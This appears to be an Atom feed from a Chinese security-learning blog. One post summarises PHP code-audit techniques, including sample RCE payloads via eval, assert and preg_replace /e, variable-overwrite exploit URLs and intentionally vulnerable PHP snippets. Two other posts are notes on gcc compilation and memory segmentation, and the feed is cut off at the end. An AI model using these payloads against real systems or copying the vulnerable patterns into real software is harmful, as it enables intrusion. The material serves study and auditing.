<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2019-12-27T15:08:27.715Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2019-12-27T14:57:56.000Z</published>
    <updated>2019-12-27T15:08:27.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h1><p>面试的时候问到了关于代码审计的思路，这里就简单总结一下。</p><p>常见的代码审计思路有以下四种：</p><ul><li>根据敏感关键字回溯参数传递过程；  （PS：即找敏感函数逆向回溯参数是否可控）</li><li>查找可控变量，正向追踪变量传递过程； （PS：即直接找可控参数正向追踪到漏洞处）</li><li>寻找敏感功能点，通读功能点代码；   （PS：即分业务功能去审计，重点关注易出现漏洞的功能如upload等）</li><li>直接通读全文代码。   （PS：直接怼项目所有文件，重点放在通防文件、配置文件、入口文件、通用函数文件等）</li></ul><h2 id="一、敏感函数回溯参数过程"><a href="#一、敏感函数回溯参数过程" class="headerlink" title="一、敏感函数回溯参数过程"></a>一、敏感函数回溯参数过程</h2><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式，因为大多数漏洞是由于函数的使用不当造成的。另外非函数使用不当的漏洞，如SQL注入，等以后学习再详细介绍。这种方式的优缺点如下：</p><ul><li>优点：只需搜索相应敏感关键字，即可快速挖掘想要的漏洞，可定向挖掘，高效、高质量；</li><li>缺点：由于没有通读代码，对程序整体架构了解不够深入，在挖掘漏洞时定位利用会花点时间，另外对逻辑漏洞挖掘覆盖不到。</li></ul><h2 id="二、通读全文代码"><a href="#二、通读全文代码" class="headerlink" title="二、通读全文代码"></a>二、通读全文代码</h2><p>通读全文代码也有一定的技巧，否则很难读懂Web程序的，也很难理解代码的业务逻辑。首先我们要看程序的大体结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，另外还要注意文件的大小，创建时间，就可以大概知道这个程序实现了那些功能，核心文件有哪些。</p><p>在看目录结构的时候，特别注意以下几个文件：</p><ul><li><strong>函数集文件</strong><br>函数集文件通常命名中包含<strong>functions或者common等关键字</strong>，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件的一个技巧就是打开index.php或者一些功能性文件。</li><li><strong>配置文件</strong><br>配置文件通常命名中包含config关键字，配置文件包括Web程序运行必须的<strong>功能性配置选项以及数据库等配置信息</strong>。从这个文件可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数是用单引号还是双引号，如果是双引号，则很可能会存在代码执行漏洞。</li><li><strong>安全过滤文件</strong><br>安全过滤文件对我们做代码审计至关重要，通常命名中有<strong>filter、safe、check</strong>等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</li><li><strong>index文件</strong><br>index是一个程序的<strong>入口文件</strong>，所以我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件。</li></ul><h2 id="三、根据功能点定向审计"><a href="#三、根据功能点定向审计" class="headerlink" title="三、根据功能点定向审计"></a>三、根据功能点定向审计</h2><p>根据经验我们简单介绍几个功能点会出现的漏洞：</p><ul><li><strong>文件上传功能</strong><br>这里说的文件上传在很多功能点都会出现，比如像<strong>文章编辑、资料编辑、头像上传、附件上传</strong>，这个功能最常见的漏洞就是任意文件上传了，后端程序没有严格地限制上传的格式，导致可以上传或者存在绕过的情况，而除了文件上传功能外，还经常发生SQL注入漏洞。</li></ul><ul><li><strong>文件管理功能</strong><br>在文件管理功能中，如果程序将文件名或者文件路径直接在参数中传递，则很有可能会存在任意文件的操作漏洞，比如任意文件读取等，利用的方法是在路径中使用../或者..\跳转目录。<br>除了任意文件操作漏洞外，还可能会存在XSS漏洞，程序会在页面中输出文件名，而通常会疏忽对文件名进行过滤，导致可以在数据库中存入带有尖括号等特殊符号的文件名，最后在页面显示的时候就会被执行。</li></ul><ul><li><strong>登录认证功能</strong><br>登录认证功能不是指一个过程，而是整个操作过程中的认证，目前的认证方式大多是基于Cookie和Session，不少程序会把当前登陆的用户账号等认证信息放到Cookie中，或许是加密方式。进行操作的时候直接从Cookie中读取当前用户信息，这里就存在一个算法可信的问题，如果这段Cookie信息没有加salt一类的东西，就可以导致任意用户登录漏洞，只要知道用户的不扥信息，即可生成认证令牌，甚至有的程序会直接把用户名放到Cookie中，操作的时候直接读取这个用户名的数据，这也是常说的越权漏洞。</li></ul><ul><li><strong>找回密码功能</strong><br>找回密码虽然看起来不像任意文件上传这种可以危害到服务器安全的漏洞，但是如果可以重置管理员的密码，也是可以间接控制业务权限甚至拿到服务权限的。找回密码功能的漏洞有很多利用场景，最常见的是验证码爆破。目前特别是APP应用，请求后端验证码的时候大多是4位，并且没有限制验证码的错误次数和有效时间，于是就出现了爆破的漏洞。</li></ul><p>下面再总结一下容易出现RCE的几个敏感点：</p><h2 id="四、PHP容易导致RCE的敏感函数"><a href="#四、PHP容易导致RCE的敏感函数" class="headerlink" title="四、PHP容易导致RCE的敏感函数"></a>四、PHP容易导致RCE的敏感函数</h2><p><strong>PHP代码执行函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure><p>这些函数会将参数当做php代码或者php函数和参数进行执行,下面进行具体的利用解释：</p><ol><li><p><strong>eval (PHP 4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> (string $code):mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：将参数字符串 $code 作为PHP代码执行</p></blockquote></li></ol><ol start="2"><li><p><strong>assert (PHP 4, PHP 5, PHP 7)</strong> </p><ul><li>PHP 5</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>PHP 7</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：判断一个断言是否为FALSE。当传入的参数assertion是字符串时，它将会被assert()当做php代码执行。</p></blockquote></li></ol><ol start="3"><li><p><strong>preg_replace(PHP 4, PHP 5, PHP 7)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure><blockquote><p>作用： <strong>/e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>PS： PHP 7.0.0 起，会产生 E_WARNING错误，同时 “\e” 也无法起效</p></blockquote></li></ol><ol start="4"><li><p><strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong>   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用： 第一个参数callback是被调用的<strong>回调函数</strong>，其余参数是回调函数的参数</p></blockquote></li></ol><ol start="5"><li><p><strong>call_user_func_array (PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , <span class="keyword">array</span> $param_arr ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入；</p></blockquote></li></ol><ol start="6"><li><p><strong>array_map (PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><blockquote><p> 作用：即将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 </p></blockquote><blockquote><p>PS：回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致</p></blockquote></li></ol><ol start="7"><li><p><strong>create_function (PHP 4 &gt;= 4.0.1, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><blockquote><p>作用： 从传递的参数创建一个匿名函数，并返回一个唯一的名称</p><p>PS：该函数是会在内部执行eval，所以安全性和eval一致</p></blockquote></li></ol><p>常见的利用payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"system('ls');"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)&lt;\/php&gt;/e"</span>, <span class="string">'\1'</span>, <span class="string">"&lt;php&gt;phpinfo()&lt;/php&gt;"</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>,<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">array_map(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br></pre></td></tr></table></figure><h2 id="五、PHP中变量覆盖"><a href="#五、PHP中变量覆盖" class="headerlink" title="五、PHP中变量覆盖"></a>五、PHP中变量覆盖</h2><p><strong>1、全局变量覆盖</strong></p><p>当<strong>register_global=ON</strong>时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等都可以,那么就可能产生变量覆盖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"&lt;br/&gt;"</span>;   </span><br><span class="line"><span class="keyword">if</span> ($shabi)&#123;  </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"you are not shabi!"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们直接提交 shabi 参数即可覆盖到原有的变量$shabi /test.php?shabi=1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are not shabi!</span><br></pre></td></tr></table></figure><p><strong>2、$$导致的变量覆盖问题</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>($id == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是一个简单的例子，我们直接提交 id 参数，就能覆盖到原变量 $id。原因在于循环中在遍历到id参数时，会因为$$产生赋值操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这样就导致了变量的覆盖</p><p><strong>3、extract()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>作用：从数组中将变量导入到当前的符号表</p></blockquote><p>在调用extract()时使用在flag选项使用EXTR_SKIP保证已有变量不会被覆盖 ，flag字段的可用选项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXTR_OVERWRITE如果有冲突，覆盖已有的变量。</span><br><span class="line">EXTR_SKIP如果有冲突，不覆盖已有的变量。</span><br><span class="line">EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。EXTR_IF_EXISTS仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</span><br></pre></td></tr></table></figure><p><strong>4、parse_str()变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><blockquote><p>作用： 如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） </p></blockquote><blockquote><p>PS： 不赞同没有 result参数的情况下使用此函数，并且在 PHP 7.2 中将<em>废弃</em>不设置参数的行为。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var=<span class="string">'shabi'</span>;  </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="keyword">print</span> $var;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码很简单，就是定义一个 $var 变量，然后用parse_str来近些URL查询字符串，那我就可以通过查询 var 参数来覆盖到原来的 $var 变量，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="keyword">var</span> = congming</span><br></pre></td></tr></table></figure><p><strong>5、import_request_variables变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(PHP <span class="number">4</span> &gt;= <span class="number">4.1</span><span class="number">.0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span><span class="number">.0</span>)  </span><br><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：将 GET／POST／Cookie 变量导入到全局作用域中</p></blockquote><blockquote><p>PS：第一个参数 types 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。</p><p>这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。</p><p>注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。</p><p>任何 GPC 以外的字母都将被忽略。</p></blockquote><blockquote><p>PPS：第二个参数 prefix 作为变量名的前缀，置于所有被导入到全局作用域的变量之前。若没有指定第二个参数很容易导致变量覆盖。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">import_request_variables(<span class="string">"g"</span>);</span><br><span class="line"><span class="keyword">if</span>($radish==<span class="string">"radish"</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FIlE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为没有指定前缀，并且函数指定了可以通过GET方式进行全局导入，我们能轻易覆盖变量，提交payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?radish=radish</span><br></pre></td></tr></table></figure><h2 id="六、反序列化"><a href="#六、反序列化" class="headerlink" title="六、反序列化"></a>六、反序列化</h2><p><strong>1、基本概念：</strong></p><ul><li>序列化：把对象转换为字节序列的过程称为对象的序列化</li><li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化</li></ul><p><strong>2、漏洞成因：</strong></p><p><strong>反序列化对象</strong>中存在<strong>魔术方法</strong>，而且魔术方法中的<strong>代码</strong>可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入，sql注入，目录遍历等等 </p><p><strong>3、漏洞本质：</strong></p><p>unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法 </p><p>先写到这里吧，下次再继续补齐。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计思路&quot;&gt;&lt;a href=&quot;#代码审计思路&quot; class=&quot;headerlink&quot; title=&quot;代码审计思路&quot;&gt;&lt;/a&gt;代码审计思路&lt;/h1&gt;&lt;p&gt;面试的时候问到了关于代码审计的思路，这里就简单总结一下。&lt;/p&gt;
&lt;p&gt;常见的代码审计思路有以下四种：&lt;/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY2</title>
    <link href="http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/"/>
    <id>http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/</id>
    <published>2019-12-21T07:57:52.000Z</published>
    <updated>2019-12-21T08:36:58.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day2"><a href="#程序员的自我修养-Day2" class="headerlink" title="程序员的自我修养 Day2"></a>程序员的自我修养 Day2</h1><p>上一篇文章是对操作系统和计组的一些基本概念进行了复习，这一篇主要是用来学习编译和链接的过程。</p><h2 id="gcc-编译过程"><a href="#gcc-编译过程" class="headerlink" title="gcc 编译过程"></a>gcc 编译过程</h2><p>我们在Linux下，对一个简单的hello.c的C文件使用命令gcc就能对其进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><p>上面的命令就是用gcc编译生成a.out，然后执行了a.out。看似很简单一气呵成，但其实gcc的过程包括了4个步骤：</p><p><strong>预处理</strong>（Prepressing）-&gt; <strong>编译</strong>（Compilation）-&gt; <strong>汇编</strong>（Assembly）-&gt; <strong>链接</strong>（Linking）， 这个gcc编译过程入下图所示：</p><p><img src="/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/gcc%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" alt></p><p>我们下面分开讲解这四个步骤。</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>预编译相当于使用了下面这个命令（-E 参数代表只进行预编译）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i （执行后输出hello.i文件）</span><br></pre></td></tr></table></figure><p>预编译过程是对源代码中#开始的预编译指令进行处理：</p><ul><li>删除所有的”#define”，展开所有的宏定义</li><li>处理所有的条件预编译指令，如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li><li>处理”#include”预编译指令，将包含文件插入到该预编译指令的位置</li><li>删除注释 “//“、”/**/“</li><li>保留所有的#pragma编译器指令</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s  （执行后输出hello.s文件）</span><br></pre></td></tr></table></figure><p>对于C语言来说，执行预编译和编译的程序是cc1；对于C++来说，对应的程序叫做cc1plus；Objective-C则是cc1obj；Java则是jc1。所以<strong>gcc只是对这些后台程序的包装，它根据不同参数要求去调用不同的预编译编译程序cc1、汇编器as、链接器ld</strong>。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o  （执行后输出hello.s文件）</span><br><span class="line">或者直接调用汇编器</span><br><span class="line">as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>也可以直接一步到位，由C源码直接预编译、编译、汇编输出成<strong>目标文件</strong>（object file）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>如果通过调用链接器ld来执行，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc -end-group crtend.o crtn.o</span><br></pre></td></tr></table></figure><p>需要将上面这一大堆文件链接起来才可以得到最后的a.out可执行文件。这里的过程后面补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day2&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day2&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day2&quot;&gt;&lt;/a&gt;程序员的自我修养 Day2&lt;/h1&gt;&lt;p&gt;上一篇文章是对操作系统和计组的一些基本概念进行了复习
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY1</title>
    <link href="http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/"/>
    <id>http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/</id>
    <published>2019-12-20T15:34:12.000Z</published>
    <updated>2019-12-24T02:38:06.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day1"><a href="#程序员的自我修养-Day1" class="headerlink" title="程序员的自我修养 Day1"></a>程序员的自我修养 Day1</h1><p>静下心来好好研究计算机底层的实现，为二进制安全的研究做好铺垫。</p><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机的结构是一种由上而下组成的层结构，通过中间件进行访问：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt></p><p>这其中每个层级之间的通信协议就称为 “<strong>接口</strong>“。下层是接口的提供者，上层是接口的使用者。每个中间层都是对它下层的包装和拓展。</p><p>从上图我们可以看出：</p><ul><li>应用程序和开发工具通过<strong>操作系统API</strong>（API：Application Programming Interface 应用程序编程接口）和运行库（不同的运行库提供不同的API，例如Linux下的Glibc提供POSIX的API等）进行交互；</li><li>运行库使用的是操作系统提供的<strong>系统调用接口</strong>（System Call Interface），在现实中常通过软件中断的方式提供（Linux系统用0x80号中断作为系统调用接口，而Window中通过0x2E号中断作为系统调用接口）；</li><li>操作系统内核层对于硬件接口来说是使用者，而硬件接口定义决定了操作系统内核。硬件和操作系统内核之间的接口常称为”<strong>硬件规格</strong>“（Hardware Specification）；</li></ul><p>这样我们就大致的了解了计算机不同层次之间的组织关系和联系方式。</p><h2 id="给进程分配内存"><a href="#给进程分配内存" class="headerlink" title="给进程分配内存"></a>给进程分配内存</h2><p>简单的直接分配地址策略会导致下面几个问题：（具体例子可以直接看书）</p><ul><li><p><strong>地址空间不隔离</strong>：因为所有程序都放在同一片内存空间中没有隔离，恶意程序或者BUG程序可能会很轻易地改写到其他程序的数据（Overflow的意思）</p></li><li><p><strong>内存使用效率低</strong>：因为地址空间连续，当前换出的程序的空间可能不够等待运行的程序的装入，造成空间的浪费。另一方面，程序运行中频繁的换入换出也会使得效率极低·</p></li><li><p><strong>程序运行的地址不确定</strong>：因为每次程序需要装入时，我们需要从内存中分配一段足够的空闲空间给它，而这个空闲空间的地址是不确定的。这就涉及到了重定位问题。</p></li></ul><p>既然直接分配内存明显是不行的，我们就可以引入一个中间件 “虚拟地址”，达到一种间接访问物理地址的方法。思路是这样的：使用<strong>某些映射方法来控制由虚拟地址到物理地址的映射</strong>过程。那么只要我们妥善控制了这个映射的方法，就能保证每一个程序之间的隔离效果。</p><h3 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h3><blockquote><p>首先附上汇编之前学过的知识：</p><p>十六进制0x串转为二进制 ：将每个位对应写成4位二进制形式</p></blockquote><p>贴上分段范例的示意图：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E5%88%86%E6%AE%B5.png" alt></p><p>上图使用的例子大概意思是： 现在有某个程序A，大小为10MB(计算：0xA00000 即是0xA个0x100000 。 其中的0x100000即是2^20个bit 即是1M。0xA个即是有10个1MB。那么就是程序A的大小为10MB)。它在虚拟地址中分配一段由0x00000000到0x00A00000的虚拟空间。 随后我们在物理地址空间里面的分配对应的相同大小的空间，假设这段空间由0x00100000到0x00B00000。<strong>虚拟空间里面的每个字节对应着物理空间里面的每个字节</strong>。那么当程序A里面访问到地址0x00001000的时候，CPU就会将这个地址转为真实的物理地址0x00101000。程序B也是同理。</p><p>假如当程序A访问虚拟地址超出了0x00A00000，就会被判断为非法访问并拒绝访问，这样就能避免程序覆盖了其他程序到导致错误。另一方面，程序不用关心它会被分配到真实物理空间的哪一区域，它只要按照自己程序的虚拟空间0x00000000到0x00A0000来编写程序和放置变量即可。</p><p>所以使用这种分段式方法基本解决了不隔离和地址不确定两个问题。我们得继续探讨如何处理效率低下的问题</p><h3 id="分页"><a href="#分页" 